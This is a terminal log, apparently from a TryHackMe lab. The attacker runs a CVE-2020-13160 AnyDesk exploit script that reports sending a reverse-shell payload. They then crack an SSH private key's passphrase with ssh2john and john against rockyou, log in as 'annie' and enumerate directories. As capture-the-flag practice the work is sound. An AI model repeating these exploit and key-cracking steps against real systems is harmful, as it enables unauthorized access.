
```sh
┌──(kali㉿kali)-[~/thm/annie]
└─$ chmod 600 id_rsa 
                                                                                    
┌──(kali㉿kali)-[~/thm/annie]
└─$ ssh annie@10.10.245.157 -i ./id_rsa
Enter passphrase for key './id_rsa': 
Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-173-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Sat May 14 16:03:44 2022 from 192.168.58.128
annie@desktop:~$ 

```

```sh
┌──(kali㉿kali)-[~]
└─$ cd exploits 
                                                                                                                              
┌──(kali㉿kali)-[~/exploits]
└─$ ls -la
total 116
drwxr-xr-x  2 kali kali  4096 Jun 13 18:39 .
drwx------ 47 kali kali  4096 Jun 13 19:58 ..
-rw-r--r--  1 kali kali  1008 Apr 22 10:54 CVE-2014-6287-searchsploit.py
-rwxr-xr-x  1 kali kali  2145 Apr 23 17:29 CVE-2014-6287.py
-rw-r--r--  1 kali kali  4969 May 23 20:05 CVE-2015-1328.c
-rw-r--r--  1 kali kali  1872 May 22 20:09 CVE-2018-16763.py
-rw-r--r--  1 kali kali  1148 Apr  5 00:10 CVE-2020-0796.py
-rw-rw-r--  1 kali kali  1892 Jun 13 18:39 CVE-2020-13160.py
-rw-r--r--  1 kali kali  3124 Apr  2 18:59 CVE-2023-7028.py
-rw-r--r--  1 kali kali 12698 May  2 21:12 CVE-2024-27198.py
-rw-r--r--  1 kali kali  2077 May 22 19:27 OnlineBookStore1.py
-rw-r--r--  1 kali kali 25722 Apr  9 17:04 eternalblue.py
-rw-------  1 kali kali 21514 Aug  6  2023 git-dumper.py
-rw-r--r--  1 kali kali  2313 Mar 21 21:42 resturant_management_system_1.0
                                                                                                                              
┌──(kali㉿kali)-[~/exploits]
└─$ python3 CVE-2020-13160.py
sending payload ...
<socket.socket fd=3, family=2, type=2, proto=0, laddr=('0.0.0.0', 0)>
<socket.socket fd=3, family=2, type=2, proto=0, laddr=('0.0.0.0', 60897)>
reverse shell should connect within 5 seconds
                                                                                                                              
┌──(kali㉿kali)-[~/exploits]
└─$ python2.7 CVE-2020-13160_2.7.py 
sending payload ...
reverse shell should connect within 5 seconds
                                                                                                                              
┌──(kali㉿kali)-[~/exploits]
└─$ python2.7 CVE-2020-13160_2.7.py
sending payload ...
reverse shell should connect within 5 seconds
                                                            
┌──(kali㉿kali)-[~/exploits]
└─$ python2.7 CVE-2020-13160_2.7.py
sending payload ...
reverse shell should connect within 5 seconds
                                                                                    
┌──(kali㉿kali)-[~/exploits]
└─$ python2.7 CVE-2020-13160_2.7.py
sending payload ...
reverse shell should connect within 5 seconds
                                                                                    
┌──(kali㉿kali)-[~/exploits]
└─$ python2.7 CVE-2020-13160_2.7.py
sending payload ...
reverse shell should connect within 5 seconds
                                                                                    
┌──(kali㉿kali)-[~/exploits]
└─$ python2.7 CVE-2020-13160_2.7.py
sending payload ...
reverse shell should connect within 5 seconds
                                                                                    
┌──(kali㉿kali)-[~/exploits]
└─$ python2.7 CVE-2020-13160_2.7.py
sending payload ...
reverse shell should connect within 5 seconds
                                                                                    
┌──(kali㉿kali)-[~/exploits]
└─$ python2.7 CVE-2020-13160_2.7.py
sending payload ...
reverse shell should connect within 5 seconds
                                                                                    
┌──(kali㉿kali)-[~/exploits]
└─$ python2.7 CVE-2020-13160_2.7.py
sending payload ...
reverse shell should connect within 5 seconds
                                                                                    
┌──(kali㉿kali)-[~/exploits]
└─$ python2.7 CVE-2020-13160_2.7.py
sending payload ...
reverse shell should connect within 5 seconds
                                                                                    
┌──(kali㉿kali)-[~/exploits]
└─$ python2.7 CVE-2020-13160_2.7.py
sending payload ...
reverse shell should connect within 5 seconds
                                                                                    
┌──(kali㉿kali)-[~/exploits]
└─$ cd ..      
                                                                                    
┌──(kali㉿kali)-[~]
└─$ mkdir thm/annie
                                                                                    
┌──(kali㉿kali)-[~]
└─$ cd thm/annie
                                                                                    
┌──(kali㉿kali)-[~/thm/annie]
└─$ ls -la
total 8
drwxrwxr-x  2 kali kali 4096 Jun 13 22:32 .
drwxr-xr-x 28 kali kali 4096 Jun 13 22:32 ..
                                                                                    
┌──(kali㉿kali)-[~/thm/annie]
└─$ nano id_rsa          
                                                                                    
┌──(kali㉿kali)-[~/thm/annie]
└─$ ssh annie@10.10.245.157 -i ./id_rsa
The authenticity of host '10.10.245.157 (10.10.245.157)' can't be established.
ED25519 key fingerprint is SHA256:psjvqDXPWOqLQKlK8kRzSuqVtvSrfysL/TwPGnhb2Jw.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:59: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.245.157' (ED25519) to the list of known hosts.
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Permissions 0664 for './id_rsa' are too open.
It is required that your private key files are NOT accessible by others.
This private key will be ignored.
Load key "./id_rsa": bad permissions
annie@10.10.245.157: Permission denied (publickey).
                                                                                    
┌──(kali㉿kali)-[~/thm/annie]
└─$ ssh2john id_rsa > sshpass      
                                                                                    
┌──(kali㉿kali)-[~/thm/annie]
└─$ cat sshpass                 
id_rsa:$sshng$6$16$fdad97937c78a386cf869ac387c59151$1894$6f70656e7373682d6b65792d7631000000000a6165733235362d637472000000066263727970740000001800000010fdad97937c78a386cf869ac387c59151000000010000000100000197000000077373682d727361000000030100010000018100d12a2622fd6f564076e42cbc2902d7883caefc9a5ad6d6f482eda5f68aa58f05fc5c8090bd242cd76a2ed3edeb51c4d5fb10361422009126b8b177d8d58ea0369ada939ea93a2e650ff6bd6907e5fc73de2e10ae8a4f9f17bc3ba5e2e0bf250206ba7f35951b0155e074ebab6dfa852e6da4e8efc6abc8f858a13ff821064ec1805e4721abe9cac4ecf97fd72e282e8f040259485f5534bf4e3d10730b10d6c4038700c5abd75b1fb3e5302b6d21b31fe5420c7655b69d932471312b3dcdb02d2c63b296a44c59dc3bb08140a87a890394fc17eb28ffa7a6ff21851f3ccf0259d8f8988bfcd7e402f16f79cbb88ed295572a8a6cd2c7a0037625e66faadbe3f5159f06a58f2d533762066f7a684a59ae75824c4358287e8d1d494527452c95997e10dddc74d0a1d79a3193b0322ce3064812a895196b86d5e1fd0c9c6d2663ea2b2e79973f0dcc63896c6c74c1393e0c7b16b8f98415d9158483d2b73ecfc9bc979ada04a45ee8251197bc5f103cfdf1056f2ce6c34302ac9d610d45a41a1f8d000005807b6a93dc517cedf364789bcf5c9264efd264ab805eaee8539985ef3f76d75d82684ce59e28cc3e8d0a1c9de6b977cfb2252269fd3156d06c765631439fc58e7a86d768c9b836953016f256f4a841d2cf3592c4439855dbef79f84e33a5214df4da1faa26da86285d2dde0ac719e100a80c4cc97a2a931d21a1459371bac23c1a24e2ce09d64cdb4feb228d7f7833ce2be1603766f46978f29100619143f71361bc3691e36f74e11094fbd409f0ead1990b31e2d9db30e04300dc074608d4920024ff2f6e7511c189b5ed40505e683b47bd143f7a7bb8f0f80d96ccee5f797e8178278f06544e0061cdcdc21fca1ad9df6ec1b48a3d664e5ee19089e899e24bc9f66fa3f18401889d3a92a35494736c1b78f0479c245e329f66017c5a13052cdc8de083763706cd095201557c6833a2b4162a36d295ae169fe28ba627a442adc75574ac105513219e12b55e049b626cc9194db50758a8c47b7c1655b432c6d376c7062fa9354d266c94eaa9c76f2d393d487e3e6db737079097e81f88fc6f99b142b34f67b27085af66de4c293e988a2b57f2d12f3261dd2a2de0bd87e4e5b3becdc83eff371e8e0cd19fede37e75ae13cae3e64776976b8e047a42a0359585371e6ea7654597f7bb54cac7752ceb2c8c6b735ed6856cc9c5c23f88de698d8ca883951a01bd396a98019574b9b788263dfa9420643f38102ed9ad1aa317cefdfc0baa3dbf20bbc453dc421957b7750ee5eba264718019819ae7aeb8e617ce67dd7294299acb103aae8263480df491b5bfb2e9816eaaf843b4f263bbf2f17da3834a69ce8bfa8cc76debcdcf3398c6409234e6f5d88cb2b55fd3ae4bf3314ff75c2220f7e98c45adcc0a9d5a3e657f339920b05bed540089d9ae19e4297393e138bc7c177a3dce94501daa084e0149fe97ca60d91ee00ea4a3334c20e1e80100a2d7ef8774450c43486b0a7105eab072383d992c0143d2d3510292390cbd9dabf4f1516373a8ffa34f32879ff8c078dbe9e3dee484ff10b7e84930d4567e6837b101773da2f8e15754a0600fb35cae864cec0770f1d1dc60764ef60d41644a209e86a5eb66e85653d68faef60caed20e161295316503cc4187711a115d013cc5ff3f8871857c5a68be1cb8f294b435b4b8ebbfed24ba282e0b3739737f429e749007e6e2909988b49dccf95c95fe6fde3504b58040fbee57d5e61a282b8c564454f067c3fe9c5626bee7c4be37d1dfa1a149704aa8039c1c2dcd7bb14037342722095a17a775b08f3ef755f6bd7f2cd54e366ec27d02c88e28dd9452b284dd6387f68250ac15c5e9d3c623897c122535e0929225ba7ebbf613d7762297df7ef74b54349f9ea3f13546df07396858658fab84b79d5fee9aaf887ee3f008a552cad5fd4192bf8d70ab351e14473c0dfe47c75d52068f6853a1c5def39226dda54ac76943cfa5da9a271b8707a4509b6ece5416115a00850760b5ece8170fac9ea214b75df91336860cdfd91609b95a9531a3e47a5fd089106ad5b6738ee395af542d0b6526ec1f23747326d67a033d51a3eaf6da2458ee643e5ee87bb179c801d79b1e58edd92234c371476d8aed2a3920a0eb04ed30d90a9a11a8a20bf40bbcc6244adf874aa42603cffe87a86c3a891721abc152fc6b6408c1fffab454928dac80429c0ee7c9a1aed8d9dbcaafd3e3043e8bc606943f87411f720534619b95ef8f1589f29699676513ac55cd79a69463b72e4678e69f3c11a0faebc83676ffa2ca51cf329ecdb5e7d06a9d39b56d79cc37957fa84516925826d861b7b51def365b35b6e3b026a8ff1c4b831a065a18532231eb3f32938523aac4ea53195fd3a5f07e8c31809681dc886a1415b2e3cea1deaa813e25590df0b726c9930557d4a9d97e2eac7eab8517528d6c6ab2cdae3f8af40c88660ddcde2bd89e90d21d6af1b97207b773fc2f99965d2f8d2db4e30c339c7d4cde573cb9e0736937d96f50daf7$1$486
                                                                                    
┌──(kali㉿kali)-[~/thm/annie]
└─$ john sshpass --wordlist=/usr/share/wordlists/rockyou.txt          
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
annie123         (id_rsa)     
1g 0:00:01:11 DONE (2024-06-13 22:40) 0.01407g/s 286.4p/s 286.4c/s 286.4C/s bibles..ailyn
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
                                                                                    
┌──(kali㉿kali)-[~/thm/annie]
└─$ ssh annie@10.10.245.157 -i ./id_rsa                     
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Permissions 0664 for './id_rsa' are too open.
It is required that your private key files are NOT accessible by others.
This private key will be ignored.
Load key "./id_rsa": bad permissions
annie@10.10.245.157: Permission denied (publickey).
                                                                                    
┌──(kali㉿kali)-[~/thm/annie]
└─$ chmod 600 id_rsa 
                                                                                    
┌──(kali㉿kali)-[~/thm/annie]
└─$ ssh annie@10.10.245.157 -i ./id_rsa
Enter passphrase for key './id_rsa': 
Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-173-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Sat May 14 16:03:44 2022 from 192.168.58.128
annie@desktop:~$ cd /temp
-bash: cd: /temp: No such file or directory
annie@desktop:~$ ls -la
total 96
drwxr-xr-x 17 annie annie 4096 Mar 23  2022 .
drwxr-xr-x  3 root  root  4096 Mar 23  2022 ..
drwxr-xr-x  3 annie annie 4096 Mar 23  2022 .anydesk
-rwxrwxr-x  1 annie annie   41 Mar 23  2022 .anydesk.sh
lrwxrwxrwx  1 annie annie    9 Mar 23  2022 .bash_history -> /dev/null
-rw-r--r--  1 annie annie  220 Mar 23  2022 .bash_logout
-rw-r--r--  1 annie annie 3771 Mar 23  2022 .bashrc
drwx------  8 annie annie 4096 Mar 23  2022 .cache
drwx------  9 annie annie 4096 Mar 23  2022 .config
drwx------  3 annie annie 4096 Mar 23  2022 .dbus
drwxr-xr-x  2 annie annie 4096 Mar 23  2022 Desktop
drwxr-xr-x  2 annie annie 4096 Mar 23  2022 Documents
drwxr-xr-x  2 annie annie 4096 Mar 23  2022 Downloads
drwx------  3 annie annie 4096 Mar 23  2022 .gnupg
-rw-------  1 annie annie  640 Mar 23  2022 .ICEauthority
drwx------  3 annie annie 4096 Mar 23  2022 .local
drwxr-xr-x  2 annie annie 4096 Mar 23  2022 Music
drwxr-xr-x  2 annie annie 4096 Mar 23  2022 Pictures
-rw-r--r--  1 annie annie  807 Mar 23  2022 .profile
drwxr-xr-x  2 annie annie 4096 Mar 23  2022 Public
-rw-r--r--  1 root  root    66 Mar 23  2022 .selected_editor
drwxr-xr-x  2 annie annie 4096 Mar 23  2022 .ssh
-rw-r--r--  1 annie annie    0 Mar 23  2022 .sudo_as_admin_successful
drwxr-xr-x  2 annie annie 4096 Mar 23  2022 Templates
-rw-rw-r--  1 annie annie   23 Mar 23  2022 user.txt
drwxr-xr-x  2 annie annie 4096 Mar 23  2022 Videos
annie@desktop:~$ cd /
annie@desktop:/$ ls -la
total 970064
drwxr-xr-x  22 root root      4096 Mar 23  2022 .
drwxr-xr-x  22 root root      4096 Mar 23  2022 ..
drwxr-xr-x   2 root root      4096 Mar 23  2022 bin
drwxr-xr-x   3 root root      4096 Mar 23  2022 boot
drwxr-xr-x  17 root root      3680 Jun 13 12:40 dev
drwxr-xr-x 109 root root      4096 May 14  2022 etc
drwxr-xr-x   3 root root      4096 Mar 23  2022 home
lrwxrwxrwx   1 root root        34 Mar 23  2022 initrd.img -> boot/initrd.img-4.15.0-173-generic
lrwxrwxrwx   1 root root        33 Mar 23  2022 initrd.img.old -> boot/initrd.img-4.15.0-76-generic
drwxr-xr-x  18 root root      4096 Mar 23  2022 lib
drwxr-xr-x   2 root root      4096 Mar 23  2022 lib64
drwx------   2 root root     16384 Mar 23  2022 lost+found
drwxr-xr-x   4 root root      4096 Mar 23  2022 media
drwxr-xr-x   2 root root      4096 Feb  3  2020 mnt
drwxr-xr-x   2 root root      4096 Mar 23  2022 opt
dr-xr-xr-x 139 root root         0 Jun 13 12:40 proc
drwx------   5 root root      4096 Mar 23  2022 root
drwxr-xr-x  21 root root       640 Jun 13 13:49 run
drwxr-xr-x   2 root root     12288 Mar 23  2022 sbin
drwxr-xr-x   2 root root      4096 Feb  3  2020 srv
-rw-------   1 root root 993244160 Mar 23  2022 swapfile
dr-xr-xr-x  13 root root         0 Jun 13 13:52 sys
drwxrwxrwt  14 root root      4096 Jun 13 13:52 tmp
drwxr-xr-x  10 root root      4096 Mar 23  2022 usr
drwxr-xr-x  12 root root      4096 Mar 23  2022 var
lrwxrwxrwx   1 root root        31 Mar 23  2022 vmlinuz -> boot/vmlinuz-4.15.0-173-generic
lrwxrwxrwx   1 root root        30 Mar 23  2022 vmlinuz.old -> boot/vmlinuz-4.15.0-76-generic
annie@desktop:/$ cd tmp
annie@desktop:/tmp$ ls -la
total 92
drwxrwxrwt 14 root  root   4096 Jun 13 13:53 .
drwxr-xr-x 22 root  root   4096 Mar 23  2022 ..
drwxrwxrwx  2 annie annie 28672 Jun 13 13:53 anydesk
drwxrwxrwt  2 root  root   4096 Jun 13 12:40 .font-unix
drwxrwxrwt  2 root  root   4096 Jun 13 12:45 .ICE-unix
drwx------  3 root  root   4096 Jun 13 12:45 systemd-private-7ca14f2d26ce4dd49c408411f58174b4-bolt.service-xFgXJT
drwx------  3 root  root   4096 Jun 13 12:45 systemd-private-7ca14f2d26ce4dd49c408411f58174b4-colord.service-rJow5x
drwx------  3 root  root   4096 Jun 13 12:40 systemd-private-7ca14f2d26ce4dd49c408411f58174b4-ModemManager.service-APe311
drwx------  3 root  root   4096 Jun 13 12:41 systemd-private-7ca14f2d26ce4dd49c408411f58174b4-rtkit-daemon.service-LB3OnB
drwx------  3 root  root   4096 Jun 13 12:40 systemd-private-7ca14f2d26ce4dd49c408411f58174b4-systemd-resolved.service-TdhIlP
drwx------  3 root  root   4096 Jun 13 12:40 systemd-private-7ca14f2d26ce4dd49c408411f58174b4-systemd-timesyncd.service-0lF5ro
drwxrwxrwt  2 root  root   4096 Jun 13 12:40 .Test-unix
-r--r--r--  1 gdm   gdm      11 Jun 13 12:45 .X1024-lock
-r--r--r--  1 root  root     11 Jun 13 12:40 .X10-lock
drwxrwxrwt  2 root  root   4096 Jun 13 12:45 .X11-unix
drwxrwxrwt  2 root  root   4096 Jun 13 12:40 .XIM-unix
annie@desktop:/tmp$ cd anydesk/
annie@desktop:/tmp/anydesk$ ls -la
total 36
drwxrwxrwx  2 annie annie 28672 Jun 13 13:53 .
drwxrwxrwt 14 root  root   4096 Jun 13 13:53 ..
prwxrwxrwx  1 root  root      0 Jun 13 13:53 ad_552_gsystem_evt_subevt_0
prwxrwxrwx  1 root  root      0 Jun 13 12:46 ad_552_lsystem_evt_subevt_0
prwxrwxrwx  1 root  root      0 Jun 13 12:46 ad_connect_queue_2875_0_evt_subevt_0
prwxrwxrwx  1 root  root      0 Jun 13 12:47 ad_connect_queue_2953_0_evt_subevt_0
prwxrwxrwx  1 root  root      0 Jun 13 12:48 ad_connect_queue_3031_0_evt_subevt_0
prwxrwxrwx  1 root  root      0 Jun 13 12:49 ad_connect_queue_3109_0_evt_subevt_0
prwxrwxrwx  1 root  root      0 Jun 13 12:50 ad_connect_queue_3187_0_evt_subevt_0
prwxrwxrwx  1 root  root      0 Jun 13 12:51 ad_connect_queue_3270_0_evt_subevt_0
prwxrwxrwx  1 root  root      0 Jun 13 12:52 ad_connect_queue_3348_0_evt_subevt_0
prwxrwxrwx  1 root  root      0 Jun 13 12:54 ad_connect_queue_3428_0_evt_subevt_0
prwxrwxrwx  1 root  root      0 Jun 13 12:54 ad_connect_queue_3566_0_evt_subevt_0
prwxrwxrwx  1 root  root      0 Jun 13 12:55 ad_connect_queue_3666_0_evt_subevt_0
prwxrwxrwx  1 root  root      0 Jun 13 12:56 ad_connect_queue_3747_0_evt_subevt_0
prwxrwxrwx  1 root  root      0 Jun 13 12:58 ad_connect_queue_3827_0_evt_subevt_0
prwxrwxrwx  1 root  root      0 Jun 13 12:58 ad_connect_queue_4129_0_evt_subevt_0
prwxrwxrwx  1 root  root      0 Jun 13 12:59 ad_connect_queue_4208_0_evt_subevt_0
prwxrwxrwx  1 root  root      0 Jun 13 13:00 ad_connect_queue_4584_0_evt_subevt_0
prwxrwxrwx  1 root  root      0 Jun 13 13:01 ad_connect_queue_4664_0_evt_subevt_0
prwxrwxrwx  1 root  root      0 Jun 13 13:02 ad_connect_queue_4764_0_evt_subevt_0
prwxrwxrwx  1 root  root      0 Jun 13 13:03 ad_connect_queue_4842_0_evt_subevt_0
prwxrwxrwx  1 root  root      0 Jun 13 13:04 ad_connect_queue_4944_0_evt_subevt_0
prwxrwxrwx  1 root  root      0 Jun 13 13:05 ad_connect_queue_5022_0_evt_subevt_0
prwxrwxrwx  1 root  root      0 Jun 13 13:06 ad_connect_queue_5100_0_evt_subevt_0
prwxrwxrwx  1 root  root      0 Jun 13 13:07 ad_connect_queue_5180_0_evt_subevt_0
prwxrwxrwx  1 root  root      0 Jun 13 13:08 ad_connect_queue_5258_0_evt_subevt_0
prwxrwxrwx  1 root  root      0 Jun 13 13:09 ad_connect_queue_5416_0_evt_subevt_0
prwxrwxrwx  1 root  root      0 Jun 13 13:10 ad_connect_queue_5494_0_evt_subevt_0
prwxrwxrwx  1 root  root      0 Jun 13 13:11 ad_connect_queue_5574_0_evt_subevt_0
prwxrwxrwx  1 root  root      0 Jun 13 13:12 ad_connect_queue_5654_0_evt_subevt_0
prwxrwxrwx  1 root  root      0 Jun 13 13:13 ad_connect_queue_5733_0_evt_subevt_0
prwxrwxrwx  1 root  root      0 Jun 13 13:14 ad_connect_queue_5811_0_evt_subevt_0
prwxrwxrwx  1 root  root      0 Jun 13 13:15 ad_connect_queue_5889_0_evt_subevt_0
prwxrwxrwx  1 root  root      0 Jun 13 13:16 ad_connect_queue_5967_0_evt_subevt_0
prwxrwxrwx  1 root  root      0 Jun 13 13:17 ad_connect_queue_6051_0_evt_subevt_0
prwxrwxrwx  1 root  root      0 Jun 13 13:18 ad_connect_queue_6108_0_evt_subevt_0
prwxrwxrwx  1 root  root      0 Jun 13 13:19 ad_connect_queue_6162_0_evt_subevt_0
prwxrwxrwx  1 root  root      0 Jun 13 13:20 ad_connect_queue_6214_0_evt_subevt_0
prwxrwxrwx  1 root  root      0 Jun 13 13:21 ad_connect_queue_6267_0_evt_subevt_0
prwxrwxrwx  1 root  root      0 Jun 13 13:22 ad_connect_queue_6320_0_evt_subevt_0
prwxrwxrwx  1 root  root      0 Jun 13 13:23 ad_connect_queue_6372_0_evt_subevt_0
prwxrwxrwx  1 root  root      0 Jun 13 13:24 ad_connect_queue_6424_0_evt_subevt_0
prwxrwxrwx  1 root  root      0 Jun 13 13:25 ad_connect_queue_6476_0_evt_subevt_0
prwxrwxrwx  1 root  root      0 Jun 13 13:26 ad_connect_queue_6528_0_evt_subevt_0
prwxrwxrwx  1 root  root      0 Jun 13 13:27 ad_connect_queue_6583_0_evt_subevt_0
prwxrwxrwx  1 root  root      0 Jun 13 13:28 ad_connect_queue_6637_0_evt_subevt_0
prwxrwxrwx  1 root  root      0 Jun 13 13:29 ad_connect_queue_6690_0_evt_subevt_0
prwxrwxrwx  1 root  root      0 Jun 13 13:30 ad_connect_queue_6743_0_evt_subevt_0
prwxrwxrwx  1 root  root      0 Jun 13 13:31 ad_connect_queue_6799_0_evt_subevt_0
prwxrwxrwx  1 root  root      0 Jun 13 13:32 ad_connect_queue_6853_0_evt_subevt_0
prwxrwxrwx  1 root  root      0 Jun 13 13:33 ad_connect_queue_6907_0_evt_subevt_0
prwxrwxrwx  1 root  root      0 Jun 13 13:34 ad_connect_queue_6972_0_evt_subevt_0
prwxrwxrwx  1 root  root      0 Jun 13 13:35 ad_connect_queue_7024_0_evt_subevt_0
prwxrwxrwx  1 root  root      0 Jun 13 13:36 ad_connect_queue_7076_0_evt_subevt_0
prwxrwxrwx  1 root  root      0 Jun 13 13:37 ad_connect_queue_7128_0_evt_subevt_0
prwxrwxrwx  1 root  root      0 Jun 13 13:38 ad_connect_queue_7184_0_evt_subevt_0
prwxrwxrwx  1 root  root      0 Jun 13 13:39 ad_connect_queue_7236_0_evt_subevt_0
prwxrwxrwx  1 root  root      0 Jun 13 13:40 ad_connect_queue_7288_0_evt_subevt_0
prwxrwxrwx  1 root  root      0 Jun 13 13:41 ad_connect_queue_7342_0_evt_subevt_0
prwxrwxrwx  1 root  root      0 Jun 13 13:42 ad_connect_queue_7394_0_evt_subevt_0
prwxrwxrwx  1 root  root      0 Jun 13 13:43 ad_connect_queue_7450_0_evt_subevt_0
prwxrwxrwx  1 root  root      0 Jun 13 13:44 ad_connect_queue_7508_0_evt_subevt_0
prwxrwxrwx  1 root  root      0 Jun 13 13:45 ad_connect_queue_7611_0_evt_subevt_0
prwxrwxrwx  1 root  root      0 Jun 13 13:46 ad_connect_queue_7663_0_evt_subevt_0
prwxrwxrwx  1 root  root      0 Jun 13 13:47 ad_connect_queue_7717_0_evt_subevt_0
prwxrwxrwx  1 root  root      0 Jun 13 13:48 ad_connect_queue_7775_0_evt_subevt_0
prwxrwxrwx  1 root  root      0 Jun 13 13:49 ad_connect_queue_7829_0_evt_subevt_0
prwxrwxrwx  1 root  root      0 Jun 13 13:50 ad_connect_queue_7904_0_evt_subevt_0
prwxrwxrwx  1 root  root      0 Jun 13 13:51 ad_connect_queue_7957_0_evt_subevt_0
prwxrwxrwx  1 root  root      0 Jun 13 13:52 ad_connect_queue_8014_0_evt_subevt_0
prwxrwxrwx  1 root  root      0 Jun 13 13:53 ad_connect_queue_8070_0_evt_subevt_0
prwxrwxrwx  1 gdm   gdm       0 Jun 13 12:47 ad_mailbox_2878_0_0_evt_subevt_0
prwxrwxrwx  1 gdm   gdm       0 Jun 13 12:46 ad_mailbox_2878_0_1_evt_subevt_0
prwxrwxrwx  1 annie annie     0 Jun 13 12:47 ad_mailbox_2900_0_0_evt_subevt_0
prwxrwxrwx  1 annie annie     0 Jun 13 12:46 ad_mailbox_2900_0_0_evt_subevt_1
prwxrwxrwx  1 annie annie     0 Jun 13 12:46 ad_mailbox_2900_0_1_evt_subevt_0
prwxrwxrwx  1 gdm   gdm       0 Jun 13 12:48 ad_mailbox_2956_0_0_evt_subevt_0
prwxrwxrwx  1 gdm   gdm       0 Jun 13 12:47 ad_mailbox_2956_0_1_evt_subevt_0
prwxrwxrwx  1 annie annie     0 Jun 13 12:48 ad_mailbox_2978_0_0_evt_subevt_0
prwxrwxrwx  1 annie annie     0 Jun 13 12:47 ad_mailbox_2978_0_0_evt_subevt_1
prwxrwxrwx  1 annie annie     0 Jun 13 12:47 ad_mailbox_2978_0_1_evt_subevt_0
prwxrwxrwx  1 gdm   gdm       0 Jun 13 12:49 ad_mailbox_3034_0_0_evt_subevt_0
prwxrwxrwx  1 gdm   gdm       0 Jun 13 12:48 ad_mailbox_3034_0_1_evt_subevt_0
prwxrwxrwx  1 annie annie     0 Jun 13 12:49 ad_mailbox_3058_0_0_evt_subevt_0
prwxrwxrwx  1 annie annie     0 Jun 13 12:48 ad_mailbox_3058_0_0_evt_subevt_1
prwxrwxrwx  1 annie annie     0 Jun 13 12:48 ad_mailbox_3058_0_1_evt_subevt_0
prwxrwxrwx  1 gdm   gdm       0 Jun 13 12:50 ad_mailbox_3112_0_0_evt_subevt_0
prwxrwxrwx  1 gdm   gdm       0 Jun 13 12:49 ad_mailbox_3112_0_1_evt_subevt_0
prwxrwxrwx  1 annie annie     0 Jun 13 12:50 ad_mailbox_3136_0_0_evt_subevt_0
prwxrwxrwx  1 annie annie     0 Jun 13 12:49 ad_mailbox_3136_0_0_evt_subevt_1
prwxrwxrwx  1 annie annie     0 Jun 13 12:49 ad_mailbox_3136_0_1_evt_subevt_0
prwxrwxrwx  1 gdm   gdm       0 Jun 13 12:51 ad_mailbox_3190_0_0_evt_subevt_0
prwxrwxrwx  1 gdm   gdm       0 Jun 13 12:50 ad_mailbox_3190_0_1_evt_subevt_0
prwxrwxrwx  1 annie annie     0 Jun 13 12:51 ad_mailbox_3212_0_0_evt_subevt_0
prwxrwxrwx  1 annie annie     0 Jun 13 12:50 ad_mailbox_3212_0_0_evt_subevt_1
prwxrwxrwx  1 annie annie     0 Jun 13 12:50 ad_mailbox_3212_0_1_evt_subevt_0
prwxrwxrwx  1 gdm   gdm       0 Jun 13 12:52 ad_mailbox_3273_0_0_evt_subevt_0
prwxrwxrwx  1 gdm   gdm       0 Jun 13 12:51 ad_mailbox_3273_0_1_evt_subevt_0
prwxrwxrwx  1 annie annie     0 Jun 13 12:52 ad_mailbox_3297_0_0_evt_subevt_0
prwxrwxrwx  1 annie annie     0 Jun 13 12:51 ad_mailbox_3297_0_0_evt_subevt_1
prwxrwxrwx  1 annie annie     0 Jun 13 12:51 ad_mailbox_3297_0_1_evt_subevt_0
prwxrwxrwx  1 gdm   gdm       0 Jun 13 12:53 ad_mailbox_3353_0_0_evt_subevt_0
prwxrwxrwx  1 gdm   gdm       0 Jun 13 12:52 ad_mailbox_3353_0_1_evt_subevt_0
prwxrwxrwx  1 annie annie     0 Jun 13 12:53 ad_mailbox_3377_0_0_evt_subevt_0
prwxrwxrwx  1 annie annie     0 Jun 13 12:52 ad_mailbox_3377_0_0_evt_subevt_1
prwxrwxrwx  1 annie annie     0 Jun 13 12:52 ad_mailbox_3377_0_1_evt_subevt_0
prwxrwxrwx  1 gdm   gdm       0 Jun 13 12:54 ad_mailbox_3431_0_0_evt_subevt_0
prwxrwxrwx  1 gdm   gdm       0 Jun 13 12:53 ad_mailbox_3431_0_1_evt_subevt_0
prwxrwxrwx  1 annie annie     0 Jun 13 12:53 ad_mailbox_3458_0_0_evt_subevt_0
prwxrwxrwx  1 annie annie     0 Jun 13 12:53 ad_mailbox_3458_0_0_evt_subevt_1
prwxrwxrwx  1 annie annie     0 Jun 13 12:53 ad_mailbox_3458_0_1_evt_subevt_0
prwxrwxrwx  1 annie annie     0 Jun 13 12:53 ad_mailbox_3503_0_0_evt_subevt_0
prwxrwxrwx  1 annie annie     0 Jun 13 12:53 ad_mailbox_3503_0_0_evt_subevt_1
prwxrwxrwx  1 annie annie     0 Jun 13 12:53 ad_mailbox_3503_0_1_evt_subevt_0
prwxrwxrwx  1 annie annie     0 Jun 13 12:53 ad_mailbox_3523_0_0_evt_subevt_0
prwxrwxrwx  1 annie annie     0 Jun 13 12:53 ad_mailbox_3523_0_0_evt_subevt_1
prwxrwxrwx  1 annie annie     0 Jun 13 12:53 ad_mailbox_3523_0_1_evt_subevt_0
